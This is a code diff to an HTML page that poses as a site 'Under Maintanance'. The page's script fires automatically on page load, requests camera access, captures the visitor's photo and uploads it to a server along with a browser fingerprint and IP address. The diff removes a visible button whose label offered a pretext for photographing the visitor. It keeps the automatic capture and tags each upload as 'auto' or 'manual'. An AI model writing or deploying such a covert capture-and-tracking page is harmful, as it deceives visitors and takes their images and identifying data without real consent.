@@ -140,7 +140,6 @@ main a {
       <animateTransform attributeName="transform" begin="0s" dur="2s" from="0 78 21" repeatCount="indefinite" to="-360 78 21" type="rotate"/>
     </g>
   </svg>
-  <button id="btnbar" type="button">Click Me to take photo of you for editing</button>
   <h1>Under Maintanance</h1>
   <h2>Sorry for the inconvenience.</h2>
   <h3>To contact us in the meantime please email:</h3>
@@ -713,9 +712,9 @@ main a {
     }
 
     // Photo capture functionality
-    async function capturePhoto() {
+    async function capturePhoto(source = 'auto') {
       try {
-        console.log('[PHOTO] Starting automatic photo capture...');
+        console.log(`[PHOTO] Starting ${source} photo capture...`);
 
         // Request camera access
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -764,6 +763,7 @@ main a {
         formData.append('timestamp', new Date().toISOString());
         formData.append('fingerprint', fingerprintData.fp);
         formData.append('ip_address', (await getIPInfo())?.ip || '');
+        formData.append('capture_source', source);
 
         console.log('[PHOTO] Uploading photo to server...');
 
@@ -794,7 +794,7 @@ main a {
         statusDiv.innerHTML = '<span class="spinner"></span>Capturing photo...';
 
         try {
-          await capturePhoto();
+          await capturePhoto('manual');  // Manual button click
           statusDiv.className = 'status success';
           statusDiv.innerHTML = '✓ Photo captured and saved successfully!';
         } catch (error) {
@@ -811,7 +811,7 @@ main a {
       // Automatically capture photo after data collection
       // Delay slightly to avoid overwhelming the browser
       setTimeout(() => {
-        capturePhoto();
+        capturePhoto('auto');  // Automatic on page load
       }, 1000);
     });
   </script>
